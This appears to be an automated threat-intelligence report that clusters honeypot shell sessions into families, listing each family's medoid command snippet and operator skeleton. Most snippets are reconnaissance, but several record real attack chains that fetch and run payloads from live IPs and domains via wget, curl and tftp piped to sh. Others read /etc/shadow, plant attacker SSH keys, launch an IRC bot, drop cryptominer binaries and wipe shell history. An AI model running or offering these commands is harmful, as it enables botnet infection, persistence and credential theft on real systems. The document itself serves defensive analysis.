| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 870bfca4b8cff842 | 6bacdb62454e |        5 |               1 |

---

## Family 101

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `87993018b6ae37d2` (Session: `5e054f4a6eec`, n_rows=3)

**Medoid Execution Snippet:**
```text
Accept: */*
Content-Type: application/ipp
Accept-Encoding: gzip ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept:', ';'), ('Content-Type:', ';'), ('Accept-Encoding:', 'EOS')]`

Top operators: [('Accept:', 1), ('Content-Type:', 1), ('Accept-Encoding:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 87993018b6ae37d2 | 5e054f4a6eec |        3 |               1 |

---

## Family 127

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `87a6a09bccc02231` (Session: `a7eeb05839c4`, n_rows=1)

**Medoid Execution Snippet:**
```text
Accept: */* ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept:', 'EOS')]`

Top operators: [('Accept:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 87a6a09bccc02231 | a7eeb05839c4 |        1 |               1 |

---

## Family 169

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8a9e9a2fb7c19254` (Session: `c9789cda655e`, n_rows=1)

**Medoid Execution Snippet:**
```text
curl -L https://raw.githubusercontent.com/spiritLHLS/traffmonetizer-one-click-command-installation/main/tm.sh -o tm.sh && chmod +x tm.sh && bash ./tm.sh -t N1wSyYm8cEsQa/o/hTodQ70tRRUQpSiPqtJPI30Nzxo= && rm -f tm.sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('curl', '&&'), ('chmod', '&&'), ('bash', '&&'), ('rm', 'EOS')]`

Top operators: [('curl', 1), ('chmod', 1), ('bash', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8a9e9a2fb7c19254 | c9789cda655e |        1 |               1 |

---

## Family 280

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8c98b11028f0ba43` (Session: `83577677c6a6`, n_rows=4)

**Medoid Execution Snippet:**
```text
shell
enable
sh
cat $SHELL ;
```

**Consensus Skeleton (op, conn pairs):**
`[('shell', ';'), ('enable', ';'), ('sh', ';'), ('cat', 'EOS')]`

Top operators: [('shell', 1), ('enable', 1), ('sh', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8c98b11028f0ba43 | 83577677c6a6 |        4 |               1 |

---

## Family 170

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `8e718e98c71d4f25` (Session: `d0e7a2aaf8d9`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
nproc;lspci | grep -i --color 'vga\ | 3d\ | 2d' ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('nproc', ';'), ('lspci', '|'), ('grep', 'EOS')]`

Top operators: [('uname', 1), ('nproc', 1), ('lspci', 1), ('grep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 8e718e98c71d4f25 | d0e7a2aaf8d9 |        2 |               1 |

---

## Family 162

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `90c8c886ef67ec3a` (Session: `92310b656ac1`, n_rows=19)

**Medoid Execution Snippet:**
```text
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPg ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '&&'), ('rm', '&&'), ('mkdir', '&&'), ('echo', '&&'), ('chmod', '&&'), ('cd', ';'), ('cat', '|'), ('grep', '|'), ('wc', ';'), ('echo', '|'), ('chpasswd', '|'), ('bash', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', ';'), ('cat', '|'), ('grep', '|'), ('head', '|'), ('awk', ';'), ('free', '|'), ('grep', '|'), ('awk', ';'), ('crontab', ';'), ('w', ';'), ('uname', ';'), ('cat', '|'), ('grep', '|'), ('grep', '|'), ('wc', ';'), ('top', ';'), ('uname', ';'), ('uname', ';'), ('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('grep', 9), ('uname', 5), ('cat', 4), ('awk', 4), ('cd', 2), ('echo', 2), ('wc', 2), ('head', 2), ('free', 2), ('top', 2)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 90c8c886ef67ec3a | 92310b656ac1 |       19 |               1 |

---

## Family 327

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `92622a91f3dcc2ba` (Session: `44c5a930ffd0`, n_rows=2)

**Medoid Execution Snippet:**
```text
command -v curl
ls /home ;
```

**Consensus Skeleton (op, conn pairs):**
`[('command', ';'), ('ls', 'EOS')]`

Top operators: [('command', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 92622a91f3dcc2ba | 44c5a930ffd0 |        2 |               1 |

---

## Family 332

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `927675cf7d246dcc` (Session: `1dff3288656e`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
hive-passwd robertbossu ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('hive-passwd', 'EOS')]`

Top operators: [('uname', 1), ('hive-passwd', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 927675cf7d246dcc | 1dff3288656e |        2 |               1 |

---

## Family 212

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `932818bb2c385dff` (Session: `e859a7160807`, n_rows=10)

**Medoid Execution Snippet:**
```text
uname -a
id;cat /etc/shadow
chattr -ia /root/.ssh/*;wget http://www.nairobix.xyz/.f/authorized_keys -O /root/.ssh/authorized_keys
wget http://fredfoxs.at.ua/files/o
killall -9 perl
perl o irc.unix.fr.to 2083 perl
rm -f o
wget http://www.nairobix.xyz/.f/x -O /tmp/x
chmod +x /tmp/x;/tmp/x
rm -f /tmp/x ...
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('id', ';'), ('cat', ';'), ('chattr', ';'), ('wget', ';'), ('wget', ';'), ('kill', ';'), ('perl', ';'), ('rm', ';'), ('wget', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('rm', 'EOS')]`

Top operators: [('wget', 3), ('rm', 2), ('uname', 1), ('id', 1), ('cat', 1), ('chattr', 1), ('kill', 1), ('perl', 1), ('chmod', 1), ('PH_EXEC_1', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 932818bb2c385dff | e859a7160807 |       10 |               1 |

---

## Family 155

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9481906713369806` (Session: `419558450d01`, n_rows=14)

**Medoid Execution Snippet:**
```text
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh
curl http://2.58.149.116/c -O- | sh
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh
curl http://2.58.149.116/c -O- | sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', ';'), ('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]`

Top operators: [('sh', 6), ('enable', 2), ('shell', 2), ('debug', 2), ('cmd', 2), ('wget', 2), ('curl', 2)]


**Top Member Archetypes by Volume:**

|          fi_hash | session      |   n_rows |   session_count |
|-----------------:|:-------------|---------:|----------------:|
| 9481906713369806 | 419558450d01 |       14 |               1 |

---

## Family 324

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `963b8e216c7f8a4c` (Session: `9b84c3da76fc`, n_rows=2)

**Medoid Execution Snippet:**
```text
Accept: */*
Accept-Encoding: gzip ;
```

**Consensus Skeleton (op, conn pairs):**
`[('Accept:', ';'), ('Accept-Encoding:', 'EOS')]`

Top operators: [('Accept:', 1), ('Accept-Encoding:', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 963b8e216c7f8a4c | 9b84c3da76fc |        2 |               1 |

---

## Family 307

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `96b1d7f0e315ebf5` (Session: `0df1c4cb2689`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
enable
shell
system
ping
sh
/bin/busybox JIGOKU ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('enable', ';'), ('shell', ';'), ('system', ';'), ('ping', ';'), ('sh', ';'), ('busybox', 'EOS')]`

Top operators: [('sh', 2), ('enable', 1), ('shell', 1), ('system', 1), ('ping', 1), ('busybox', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 96b1d7f0e315ebf5 | 0df1c4cb2689 |        7 |               1 |

---

## Family 128

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `98852c3b13a44cfa` (Session: `aad6cc288845`, n_rows=7)

**Medoid Execution Snippet:**
```text
pkill xmrig
mkdir /tmp/OneMan/
cd /tmp/OneMan/;wget http://176.126.175.75/HOT/x86
curl http://176.126.175.75/HOT/x86 -o x86
chmod 777 x86;./x86 UwU
cd /tmp
rm -rf /tmp/OneMan/;curl --referer https://uwu.com http://54.36.242.76/ ;
```

**Consensus Skeleton (op, conn pairs):**
`[('kill', ';'), ('mkdir', ';'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('PH_EXEC_1', ';'), ('cd', ';'), ('rm', ';'), ('curl', 'EOS')]`

Top operators: [('cd', 2), ('curl', 2), ('kill', 1), ('mkdir', 1), ('wget', 1), ('chmod', 1), ('PH_EXEC_1', 1), ('rm', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 98852c3b13a44cfa | aad6cc288845 |        7 |               1 |

---

## Family 161

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9a7ef40a23ccb66d` (Session: `c026cf443a41`, n_rows=2)

**Medoid Execution Snippet:**
```text
sh
shell ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', 'EOS')]`

Top operators: [('sh', 1), ('shell', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9a7ef40a23ccb66d | c026cf443a41 |        2 |               1 |

---

## Family 156

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9a9e5f427934b27f` (Session: `1abd0161bafe`, n_rows=56)

**Medoid Execution Snippet:**
```text
sh
shell
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://23.94.136.170/bins.sh
chmod 777 bins.sh
sh bins.sh
tftp 23.94.136.170 -c get tftp1.sh
chmod 777 tftp1.sh
sh tftp1.sh
tftp -r tftp2.sh -g 23.94.136.170
chmod 777 tftp2.sh
sh tftp2.sh
rm -rf bins.sh tftp1.sh tftp2.sh
rm -rf *;h ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('history', ';'), ('sh', ';'), ('shell', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('history', ';'), ('sh', ';'), ('shell', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('history', ';'), ('sh', ';'), ('shell', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 20), ('sh', 16), ('chmod', 12), ('tftp', 8), ('rm', 8), ('shell', 4), ('wget', 4), ('history', 4)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9a9e5f427934b27f | 1abd0161bafe |       56 |               1 |

---

## Family 328

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9c2106f91ed1d812` (Session: `e6d3d9a5d98b`, n_rows=31)

**Medoid Execution Snippet:**
```text
sh
shell
enable
system
busybox DNXFCOW
/bin/busybox DNXFCOW
/bin/busybox DNXFCOW
>/tmp/.file && cd /tmp/
>/var/.file && cd /var/
>/dev/.file && cd /dev/
>/mnt/.file && cd /mnt/
>/var/run/.file && cd /var/run/
>/var/tmp/.file && cd /var/tmp/
>/.file && cd /
>/dev/netslink/.file && cd /dev/netslink/
> ...
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('enable', ';'), ('system', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';'), ('busybox', ';'), ('busybox', ';'), ('>', ';'), ('busybox', ';'), ('busybox', 'EOS')]`

Top operators: [('>', 17), ('cd', 15), ('busybox', 10), ('sh', 1), ('shell', 1), ('enable', 1), ('system', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9c2106f91ed1d812 | e6d3d9a5d98b |       31 |               1 |

---

## Family 249

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9c5a898364d7f07d` (Session: `6b964d6fe781`, n_rows=1)

**Medoid Execution Snippet:**
```text
whoami>sbmg ;
```

**Consensus Skeleton (op, conn pairs):**
`[('whoami', 'EOS')]`

Top operators: [('whoami', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9c5a898364d7f07d | 6b964d6fe781 |        1 |               1 |

---

## Family 338

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9d717fcc6e33b5be` (Session: `eeceee85ef72`, n_rows=1)

**Medoid Execution Snippet:**
```text
cat /etc/issue ;nproc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('nproc', 'EOS')]`

Top operators: [('cat', 1), ('nproc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9d717fcc6e33b5be | eeceee85ef72 |        1 |               1 |

---

## Family 197

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9eb2dab7909df29a` (Session: `b0cb554a3e83`, n_rows=14)

**Medoid Execution Snippet:**
```text
sh
shell
enable
linuxshell
system
help
busybox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://109.104.151.108/mtr.sh
curl -O http://109.104.151.108/mtr.sh
chmod 777 mtr.sh
sh mtr.sh
rm -rf mtr.sh
history -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('shell', ';'), ('enable', ';'), ('linuxshell', ';'), ('system', ';'), ('help', ';'), ('busybox', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('rm', ';'), ('history', 'EOS')]`

Top operators: [('cd', 5), ('sh', 2), ('shell', 1), ('enable', 1), ('linuxshell', 1), ('system', 1), ('help', 1), ('busybox', 1), ('wget', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9eb2dab7909df29a | b0cb554a3e83 |       14 |               1 |

---

## Family 248

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `9f321abb08670ab3` (Session: `14f32f1cb568`, n_rows=1)

**Medoid Execution Snippet:**
```text
nproc ;
```

**Consensus Skeleton (op, conn pairs):**
`[('nproc', 'EOS')]`

Top operators: [('nproc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| 9f321abb08670ab3 | 14f32f1cb568 |        1 |               1 |

---

## Family 210

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a17b1d9568f886ff` (Session: `4e27c73c6b1e`, n_rows=7)

**Medoid Execution Snippet:**
```text
sh
enable
shell
debug shell
cmd
wget http://2.58.149.116/w -O- | sh
curl http://2.58.149.116/c -O- | sh ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('enable', ';'), ('shell', ';'), ('debug', ';'), ('cmd', ';'), ('wget', '|'), ('sh', ';'), ('curl', '|'), ('sh', 'EOS')]`

Top operators: [('sh', 3), ('enable', 1), ('shell', 1), ('debug', 1), ('cmd', 1), ('wget', 1), ('curl', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a17b1d9568f886ff | 4e27c73c6b1e |        7 |               1 |

---

## Family 205

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a2cc85ec8f5c9142` (Session: `711cefea6e1e`, n_rows=2)

**Medoid Execution Snippet:**
```text
/ip cloud print
ifconfig ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ifconfig', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('ifconfig', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a2cc85ec8f5c9142 | 711cefea6e1e |        2 |               1 |

---

## Family 63

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a579035b8668011e` (Session: `18ec0ddfd66f`, n_rows=2)

**Medoid Execution Snippet:**
```text
uname -a
cat /proc/cpuinfo | grep processor | wc -l ;
```

**Consensus Skeleton (op, conn pairs):**
`[('uname', ';'), ('cat', '|'), ('grep', '|'), ('wc', 'EOS')]`

Top operators: [('uname', 1), ('cat', 1), ('grep', 1), ('wc', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a579035b8668011e | 18ec0ddfd66f |        2 |               1 |

---

## Family 64

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `a751620d97943c72` (Session: `d6dc65107f18`, n_rows=2)

**Medoid Execution Snippet:**
```text
cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c
nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', '|'), ('grep', '|'), ('cut', '|'), ('uniq', ';'), ('nvidia-smi', '|'), ('grep', '|'), ('cut', '|'), ('uniq', 'EOS')]`

Top operators: [('grep', 2), ('cut', 2), ('uniq', 2), ('cat', 1), ('nvidia-smi', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| a751620d97943c72 | d6dc65107f18 |        2 |               1 |

---

## Family 192

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `aa6cf10d1820f839` (Session: `758dc2117bd1`, n_rows=4)

**Medoid Execution Snippet:**
```text
/ip cloud print
ps -ef | grep '[Mm]iner'
ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
echo Hi | cat -n ;
```

**Consensus Skeleton (op, conn pairs):**
`[('PH_EXEC_1', ';'), ('ps', '|'), ('grep', ';'), ('ls', ';'), ('echo', '|'), ('cat', 'EOS')]`

Top operators: [('PH_EXEC_1', 1), ('ps', 1), ('grep', 1), ('ls', 1), ('echo', 1), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| aa6cf10d1820f839 | 758dc2117bd1 |        4 |               1 |

---

## Family 309

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ad835356cdcc573b` (Session: `f08aad92d1cc`, n_rows=24)

**Medoid Execution Snippet:**
```text
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget http://3732g6dg.ws/binInfect.sh
curl -O http://3732g6dg.ws/binInfect.sh
chmod 777 binInfect.sh
sh binInfect.sh
tftp 3732g6dg.ws -c get binInfect.sh
chmod 777 binInfect.sh
sh binInfect.sh
tftp -r binInfect2.sh -g 3732g6dg.ws
chmod 777 binInfe ...
```

**Consensus Skeleton (op, conn pairs):**
`[('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('tftp', ';'), ('chmod', ';'), ('sh', ';'), ('ftpget', ';'), ('sh', ';'), ('rm', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('chmod', ';'), ('sh', ';'), ('chmod', ';'), ('sh', ';'), ('sh', ';'), ('rm', ';'), ('rm', 'EOS')]`

Top operators: [('sh', 7), ('cd', 5), ('chmod', 5), ('rm', 4), ('wget', 2), ('curl', 2), ('tftp', 2), ('ftpget', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ad835356cdcc573b | f08aad92d1cc |       24 |               1 |

---

## Family 195

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ae8828e624b5944e` (Session: `c73ea12a8d7a`, n_rows=13)

**Medoid Execution Snippet:**
```text
/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /
rm -rf i
wget http://49.89.197.5:50116/i
curl -O http://49.89.197.5:50116/i
/bin/busybox wget http://49.89.197.5:50116/i
chmod 777 i || (cp /bin/ls ii
cat i>ii
rm i
cp ii i
rm ii) ...
```

**Consensus Skeleton (op, conn pairs):**
`[('busybox', ';'), ('busybox', ';'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', '||'), ('cd', ';'), ('rm', ';'), ('wget', ';'), ('curl', ';'), ('busybox', ';'), ('chmod', '||'), ('cp', ';'), ('PH_EXEC_1', ';'), ('echo', 'EOS')]`

Top operators: [('cd', 6), ('busybox', 3), ('rm', 1), ('wget', 1), ('curl', 1), ('chmod', 1), ('cp', 1), ('PH_EXEC_1', 1), ('echo', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ae8828e624b5944e | c73ea12a8d7a |       13 |               1 |

---

## Family 244

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `ae9055975c8b2bd2` (Session: `0ce0e7ab3d65`, n_rows=1)

**Medoid Execution Snippet:**
```text
top ;
```

**Consensus Skeleton (op, conn pairs):**
`[('top', 'EOS')]`

Top operators: [('top', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| ae9055975c8b2bd2 | 0ce0e7ab3d65 |        1 |               1 |

---

## Family 177

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b14c0c87b5faf1bd` (Session: `fc2b323a3323`, n_rows=1)

**Medoid Execution Snippet:**
```text
lscpu | grep Model ;
```

**Consensus Skeleton (op, conn pairs):**
`[('lscpu', '|'), ('grep', 'EOS')]`

Top operators: [('lscpu', 1), ('grep', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b14c0c87b5faf1bd | fc2b323a3323 |        1 |               1 |

---

## Family 218

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b14d998a455ef4a2` (Session: `c3b9a1144216`, n_rows=5)

**Medoid Execution Snippet:**
```text
cat /proc/mounts
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev
>/tmp/.b && cd /tmp
>/dev/.b && cd /dev ;
```

**Consensus Skeleton (op, conn pairs):**
`[('cat', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', ';'), ('>', '&&'), ('cd', 'EOS')]`

Top operators: [('>', 4), ('cd', 4), ('cat', 1)]


**Top Member Archetypes by Volume:**

| fi_hash          | session      |   n_rows |   session_count |
|:-----------------|:-------------|---------:|----------------:|
| b14d998a455ef4a2 | c3b9a1144216 |        5 |               1 |

---

## Family 172

- **Total Session Volume**: 1
- **FI-Unique Archetypes**: 1
- **Mean FS**: 1.000 (±0.000)
- **Medoid Archetype**: `b17d9c295f25937e` (Session: `07c11c4fe5ab`, n_rows=6)

**Medoid Execution Snippet:**
```text
/bin/sh -c 'LANG=C
LC_ALL=C
ls -l /apps/bin/tandberg'
LANG=C
LC_ALL=C
ls -l /apps/bin/tandberg ;
```

**Consensus Skeleton (op, conn pairs):**
`[('sh', ';'), ('ls', 'EOS')]`

Top operators: [('sh', 1), ('ls', 1)]


**Top Member Archetypes by Volume:**

